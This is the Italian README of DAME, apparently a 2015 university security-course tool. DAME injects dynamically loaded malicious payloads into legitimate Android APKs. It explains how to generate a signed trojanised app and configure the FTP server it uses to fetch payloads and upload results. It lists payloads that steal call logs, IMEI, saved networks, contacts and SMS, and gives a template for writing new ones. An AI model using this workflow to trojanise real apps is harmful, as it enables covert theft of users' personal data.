@@ -1,0 +1,392 @@
+          _____                    _____                    _____                    _____          
+         /\    \                  /\    \                  /\    \                  /\    \         
+        /::\    \                /::\    \                /::\____\                /::\    \        
+       /::::\    \              /::::\    \              /::::|   |               /::::\    \       
+      /::::::\    \            /::::::\    \            /:::::|   |              /::::::\    \      
+     /:::/\:::\    \          /:::/\:::\    \          /::::::|   |             /:::/\:::\    \     
+    /:::/  \:::\    \        /:::/__\:::\    \        /:::/|::|   |            /:::/__\:::\    \    
+   /:::/    \:::\    \      /::::\   \:::\    \      /:::/ |::|   |           /::::\   \:::\    \   
+  /:::/    / \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______    /::::::\   \:::\    \  
+ /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \  /:::/\:::\   \:::\    \ 
+/:::/____/     \:::|    |/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\/:::/__\:::\   \:::\____\
+\:::\    \     /:::|____|\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /\:::\   \:::\   \::/    /
+ \:::\    \   /:::/    /  \/____/ \:::\/:::/    /  \/____/      /:::/    /  \:::\   \:::\   \/____/ 
+  \:::\    \ /:::/    /            \::::::/    /               /:::/    /    \:::\   \:::\    \     
+   \:::\    /:::/    /              \::::/    /               /:::/    /      \:::\   \:::\____\    
+    \:::\  /:::/    /               /:::/    /               /:::/    /        \:::\   \::/    /    
+     \:::\/:::/    /               /:::/    /               /:::/    /          \:::\   \/____/     
+      \::::::/    /               /:::/    /               /:::/    /            \:::\    \         
+       \::::/    /               /:::/    /               /:::/    /              \:::\____\        
+        \::/____/                \::/    /                \::/    /                \::/    /        
+         ~~                       \/____/                  \/____/                  \/____/         
+                                                                                                    
+
+                               DAME - Dynamic Android Malware Engine
+                                 Università degli Studi del Sannio
+                             Sicurezza delle Reti e dei Sistemi Software
+                             			   A.A. 2014-2015
+                             			   
+I. AUTORI
+
+	* Danilo Cianciulli
+	* Ermanno Francesco Sannini
+	* Roberto Falzarano
+
+II. LICENZA
+
+	// TODO
+
+III. CHANGE HISTORY
+
+	* 1.0.0-RELEASE 	2015-02-17
+
+IV. CONTENUTO
+
+	1. INTRODUZIONE
+	2. PREREQUISITI
+		2.1 PREREQUISITI DI UTILIZZO
+		2.2 PREREQUISITI DI SVILUPPO
+	3. UTILIZZO
+		3.1 OPZIONI
+		3.2 CONFIGURAZIONE SERVER FTP
+		3.3 PAYLOADS
+		3.4 OUTPUT
+	4. SVILUPPO
+		4.1 SCRITTURA PAYLOAD
+		4.2 GENERAZIONE BINARI
+	5. SVILUPPI FUTURI
+	
+1. INTRODUZIONE
+
+// TODO
+Scrivere una introduzione su cosa è DAME e su cosa lo caratterizza
+
+2. PREREQUISITI
+
+In questa sezione sono elencati i prerequisiti di DAME che si differenziano a seconda se
+si intente sviluppare o solo utilizzare.
+
+2.1 PREREQUISITI DI UTILIZZO
+
+Prima di procedere all'utilizzo di DAME bisogna assicurarsi di aver installato tutti i
+sequenti pacchetti software sulla propria macchina:
+	* Java SE JRE (>= 1.7)	--> http://www.oracle.com/technetwork/java/javase/downloads/index.html
+	* Android SDK Tools 	--> http://developer.android.com/sdk/index.html
+	* Androguard 			--> https://code.google.com/p/androguard/
+	* Python (>= 2.7.6)		--> https://www.python.org/downloads/
+
+In alternativa è possibile eseguire DAME nella virtual machine A.R.E
+(Android Reverse Engineering) scaricabile da https://redmine.honeynet.org/projects/are/wiki
+A.R.E. ha però software obsoleto, per cui, se si decidesse di utilizzarlo,
+è fondamentale procedere all'aggiornamento di Java, Android SDK Tools e Python alle ultime
+versioni disponibili.
+
+Se non si è interessati allo sviluppo, è possibile saltare direttamente alla sezione 3.
+
+2.2 PREREQUISITI DI SVILUPPO
+
+Prima di procedere nello sviluppo di DAME bisogna assicurarsi di aver installato tutti i
+seguenti pacchetti software sulla macchina:
+	* Java SE JDK (>= 1.7) 	--> http://www.oracle.com/technetwork/java/javase/downloads/index.html
+	* Android SDK Tools 	--> http://developer.android.com/sdk/index.html
+	* Androguard 			--> https://code.google.com/p/androguard/
+	* Ant (>= 1.9.3)		--> http://ant.apache.org/
+	* Maven (>= 3.2.3)		--> http://maven.apache.org/
+	* Python (>= 2.7.6)		--> https://www.python.org/downloads/
+
+Come per l'utilizzo, anche lo sviluppo può essere effettuato nella virtual machine A.R.E.
+È fondamentale però procedere all'aggiornamento dei pacchetti Java, Android SDK Tools, Ant,
+Maven e Python alle ultime versioni disponibili.
+
+Prima di procedere con lo sviluppo è necessario inoltre seguire la seguente procedura per
+l'istallazione dell'API 19 di Android nel proprio repository locale Maven.
+	1. Aggiornare il proprio SDK Android e installare la versione 21.1.2 dei build tools,
+	   e la versione 19 dell'API di Android.
+	2. Annotare la posizione del file android.jar relativo alla versione 19 dell'API, ad
+	   esempio /opt/android-sdk/platforms/android-19/android.jar.
+	3. Da terminale eseguire il comando:
+		$ mvn install:install-file -Dfile=<android-jar> -DgroupId=com.google.android
+				-DartifactId=android -Dversion=19 -Dpackaging=jar -DgeneratePom=true
+	   Sostituendo <android-jar> con il percorso annotato al punto 2.
+
+Affinché gli script Ant funzionino correttamente, è necessario inoltre aggiornare il file
+local.properties affinché sia adattato al proprio environment.
+Per fare questo, seguire il seguente procedimento:
+	1. Annotare il percorso del progetto dame-android, ad esempio ~/dame/dame-android se il
+	   il progetto parent è stato stato scompattato nella propria home.
+	2. Spostarsi nella directory tools della proria SDK Android, ad esempio
+	   /opt/android-sdk/tools.
+	3. Eseguire da terminale il comando:
+		$ ./android update project -p <dame-android-path>
+	   Sostituendo <dame-android-path> con il percorso annotato al punto 1.
+Questo permette di generare il file local.properties nella root di dame-android che contiene
+il percorso dell'SDK.
+
+3. UTILIZZO
+
+Nella directory releases è presente l'archivio dell'ultima release di DAME.
+Scompattare l'archivio dove si preferisce.
+
+L'eseguibile di DAME è accessibile attraverso lo script dame.
+
+DAME fornisce un'interfaccia a linea di comando:
+	$ dame [options...] FILE.apk
+L'unico parametro obbligatorio è FILE.apk che deve puntare all'APK su cui si vuole far
+operare DAME.
+
+3.1 OPZIONI
+
+La seguente lista mostra le diverse opzioni ammesse da DAME.
+(Eseguire il file dame senza parametri per mostrarlo a schermo).
+
+ -ag (--androguard) VAL          : androguard path (~/tools/androguard/ by
+                                   default)
+ -at (--apktool) VAL             : apktool path (./tools/apktool by default)
+ -bt (--android-build-tools) VAL : Android build tools path (~/tools/android/and
+                                   roid-sdk-linux_x86/build-tools/21.1.2/ by
+                                   default)
+ -c (--ftp-server-config) FILE   : ftp server file config (config.properties in
+                                   the source apk path by default)
+ -o (--output) VAL               : apk file dest path (out.apk in the source
+                                   apk path by default)
+ -py VAL                         : python path (system path by default)
+ -v (--version)                  : Prints the engine version and build time.
+ 
+L'opzione -ag (o --androguard) serve ad indicare all'engine la posizione in cui è installato
+Androguard. Se questa opzione non è specificata, si utilizza di default il path ~/tools/androguard.
+Se la posizione è diversa, e non si vuole specificare ad ogni esecuzione il path giusto, si può
+creare un collegamento simbolico:
+	$ ln -s <real-androguard-path> ~/tools/androguard
+Potrebbe essere necessario sostituire ~ con il path assoluto della propria home.
+
+L'opzione -at (o --apktool) serve ad indicare all'engine la posizione di apktool. DAME ha
+già una propria versione di apktool built-in che usa di default, ma con questa opzione è
+possibile utilizzarne un'altra.
+
+L'opzione -bt (o --android-build-tools) serve ad indicare all'engine la posizione dei build
+tools di Android. Di default usa il path ~/tools/android/android-sdk-linux_x86/build-tools/21.1.2/
+relativo alla propria home. Se la posizione è diversa, e non si vuole specificare ad ogni
+esecuzione il path giusto, si può creare un collegamento simbolico come per l'opzione -ag
+
+L'opzione -c (o --ftp-server-config) serve ad indicare all'engine la posizione del file di
+configurazione del server FTP utilizzato dall'applicazione malicious per il download dei
+payload e per l'upload degli output degli stessi. Di default l'engine cerca il file
+config.properties nella stessa directory dell'APK sorgente. Nella sezione 3.2 è mostrata la
+struttura del file di configurazione da fornire all'engine.
+
+L'opzione -o (o --output) serve ad indicare all'engine la posizione in cui salvare l'APK
+malicious ottenuto a valle dell'esecuzione di DAME. Di default l'engine scrive il file
+out.apk nella stessa directory in cui si trova l'APK sorgente, eventualmente sovrascrivendo
+se il file è già esistente.
+
+L'opzione -py serve ad indicare all'engine la posizione dell'eseguibile python da utilizzare.
+Di default l'engine cerca l'eseguibile nel path di sistema.
+
+Infine l'opzione -v (o --version) stampa a video la versione dell'engine e la data di build.
+Questa opzione può essere usata anche senza specificare l'APK sorgente.
+
+Una volta eseguito dame con parametri ed opzioni opportuni, l'engine analizza l'APK sorgente
+e mostra la lista di payload che possono essere iniettati. I diversi payload disponibili
+utilizzano determinati permessi che devono essere già presenti nell'app trusted affinché
+possano essere utilizzati. È possibile decidere quali payload inserire specificandone gli
+indici mostrati separati da virgola.
+A valle dell'esecuzione si ottiene l'APK modificato già firmato ed ottimizzato che può essere
+direttamente installato su un dispositivo Android.
+
+3.2 CONFIGURAZIONE SERVER FTP
+
+L'app malicious non contiene al proprio interno i payload scelti, ma solo le chiamate che
+permettono di eseguirli. La prima volta che l'app accede lecitamente ad Internet, l'applicazione
+modificata scarica i payload, mentre le volte successive fa l'upload degli output.
+È quindi necessario indicare all'engine gli URL da utilizzare per il download dei payload e per
+l'upload degli output.
+Tali indicazioni vanno specificate in un file di configurazione da passare all'engine attraverso
+l'opzione -c (o --ftp-server-config). Di default l'engine cerca il file config.properties nella
+stessa directory dell'APK sorgente.
+
+Il file di configurazione deve essere così strutturato:
+
+	server=<indirizzo del server ftp comprensivo di schema e, se diversa da 21, di porta>
+	payload_uri=<path relativo alla root del server che punta al jar dei payload>
+	result_uri=<path relativo alla root che indica la directory in cui salvare gli output>
+	username=<username da utilizzare per il login>
+	password=<password da utilizzare per il login>
+	passive_mode=<true o false, a seconda se si vuole utilizzare la modalità passiva o attiva>
+
+Ad esempio, si potrebbe avere
+
+	server=ftp://10.0.2.2
+	payload_uri=/DAME/payloads.jar
+	result_uri=/DAME/results/
+	username=userftp
+	password=srss2015
+	passive_mode=false
+
+Nell'esempio il server utilizza la porta 21 di default. Se la porta è diversa bisogna indicare,
+ad esempio,
+
+	server=ftp://10.0.2.2:1234
+
+Il jar dei payload è conenuto nella cartella payloads-jar della release. È necessario copiare
+questo file sul proprio server FTP nella posizione indicata nel file di configurazione.
+Assicurarsi, inoltre che il proprio server FTP abbia la directory indicata in result_uri accessibile
+in scrittura e che il file indicato in payload_uri sia accessibile in lettura.
+
+3.3 PAYLOADS
+
+I payload sono le unità di codice malevolo che vengono caricate dinamicamente a run-time dall'app
+malicious. I payload utilizzano dei permessi che devono essere già presenti ed utilizzati nell'app
+trusted, e possono essere eseguiti solo una volta (alla prima chiamata) o ad ogni chiamata.
+
+Nell'ultima release, DAME ha integrati i seguenti payload:
+
+	* CallsLog
+	Questo payload permette di ottenere la lista delle chiamate effettuate. Viene eseguito
+	ogni volta che viene chiamato.
+
+	* IMEI
+	Questo payload permette di ottenere l'IMEI del dispositivo in cui è eseguito.
+	Viene eseguito una sola volta alla prima chiamata.
+	
+	* Networks
+	Questo payload permette di ottenere la lista delle reti salvate. Viene eseguito ogni
+	volta che viene chiamato.
+	
+	* ReadContacts
+	Questo payload permette di ottenere la lista dei contatti. Viene eseguito una sola volta
+	alla prima chiamata (per motivi prestazionali).
+	
+	* SMSInbox
+	Questo payload permette di ottenere la lista degli SMS salvati nel dispositivo. Viene
+	eseguito solo alla prima chiamata (per motivi prestazionali).
+
+Per sviluppare altri payload, seguire la sezione di sviluppo, dopo essersi assicurati di aver
+soddisfatto i prerequisiti.
+
+3.4 OUTPUT
+
+Gli output dell'esecuzione dei payload vengono caricati nella directory indicata del server FTP.
+La nomenclatura segue la seguente sintassi:
+
+	<Nome-del-payload>-<date>-<time>.txt
+
+In cui
+	* <Nome-del-payload> è l'identificativo del payload, ad esempio IMEI o SMSInbox;
+	* <date> è la data nel formato yyyyMMdd, ad esempio 20150217 per indicare il
+	  17 febbraio 2015;
+	* <time> è l'ora comprensiva di millisecondi nel formato HHmmssSSSS, ad esempio
+	  152645874 indica le ore 15:26:45.874
+	  
+
+4. SVILUPPO
+
+Prima di leggere questa sezione, bisogna seguire le istruzioni della sezione 2.2.
+
+Il progetto DAME utilizza Maven come sistema di gestione delle dipendenze e installazione.
+
+DAME è composto da due sotto-progetti: dame-engine e dame-android.
+Il primo contiene la logica di DAME per quanto riguarda la modifica dell'APK sorgente e la
+generazione dell'APK malicious.
+Il secondo, da cui dipende il primo, contiene le classi e i servizi per Android che vengono
+iniettati nell'APK.
+dame-engine utilizza dame-android per la generazione del codice smali utilizzato per l'iniezione.
+
+
+4.1 SCRITTURA PAYLOAD
+
+Oltre ai payload forniti di default, è possibile, nel progetto dame-android, svilupparne altri
+seguento le seguenti regole.
+
+	1. Per ogni payload creare un sotto-package di it.unisannio.srss.dame.android.payloads
+	2. Nel package creato nel punto 1, creare una classe che estenda
+			it.unisannio.srss.dame.android.payloads.Payload
+	3. Nella classe creata nel punto 2, implementare due costruttori:
+		3.1 Il primo, senza argomenti che chiama semplicemente il super(), è utilizzato
+			dall'engine per l'enumerazione dei payload;
+		3.2 Il secondo deve avere come parametro un oggetto di tipo
+				android.content.Context
+			che deve passare alla super classe.
+	4. Implementare il metodo
+			public synchronized void run();
+	   in cui inserire la logica del payload, eventualmente utilizzando l'oggetto Context
+	   ottenibile dalla super classe.
+	5. Per salvare l'output del payload utilizzare il metodo save(String) della super-classe.
+
+I servizi Android iniettati dall'engine si occupano di chiamare il metodo run() nel momento più
+opportuno, oltre a fornire la logica di salvataggio degli output.
+
+Ad esempio, se si vuole realizzare un payload con nome MyPayload, si avrebbe:
+
+	package it.unisannio.srss.dame.android.payloads.mypayload;
+	
+	import it.unisannio.srss.dame.android.payloads.Payload;
+	import android.content.Context;
+	
+	public class MyPayload extends Payload {
+		
+		public MyPayload() {
+			super();
+		}
+		
+		public MyPayload(Context context) {
+			super(context);
+		}
+		
+		// @Override
+		public synchronized void run() {
+			// logica del payload
+			// utilizzare this.context all'occorrenza
+			// utilizzare save(String) per salvare l'output
+		}
+	}
+
+Per ogni payload, va specificato un file di configurazione che deve avere come nome payload.properties
+e deve trovarsi necessariamente nello stesso package della classe che estende Payload.
+Tale file deve contenere i seguenti campi:
+
+	# whatever (required, must be unique)
+	name=<nome-del-payload>
+	# whatever (not required)
+	description=<descrizione>
+	# comma separated permissions (not required)
+	permissions=<permesso[,permesso...]>
+	# once or always. If missing, assumes once
+	execution=<once-or-always>
+
+Il nome del payload deve essere univoco, tutti gli altri campi possono anche essere omessi.
+Nel campo permissions, bisogna inserire tutti i permessi richiesti dal payload, separati
+da virgola. Non è necessario il prefisso android.permission per i permessi.
+Il campo execution, se impostato ad once, fa sì che il payload venga eseguito una sola volta.
+Se si usa always, invece, il payload può essere eseguito più di una volta.
+
+Per il payload di esempio visto prima, si potrebbe avere come configurazione:
+
+	name=MyPayload
+	description=This payload does nothing
+	permissions=READ_CONTACTS
+	execution=once
+
+4.2 GENERAZIONE BINARI
+
+Per la compilazione e la generazione dei binari, seguire la seguente procedura:
+	1. Spostarsi da terminale nella root del progetto parent.
+	2. Eseguire il comando
+		$ mvn clean install
+
+A seguito di questa operazione, nella directory dame-engine/dist ci si ritrova
+tutto ciò che è necessario per eseguire DAME.
+Contestualmente, nella directory releases, viene inserito un file tar.gz il cui nome
+dipende dalla versione del progetto definita nei file pom e che contiene tutto ciò che
+è presente in dame-engine/dist a seguito della progedura di installazione maven.
+
+
+5. SVILUPPI FUTURI
+
+// TODO
+
+
+
+
+
+
+ 
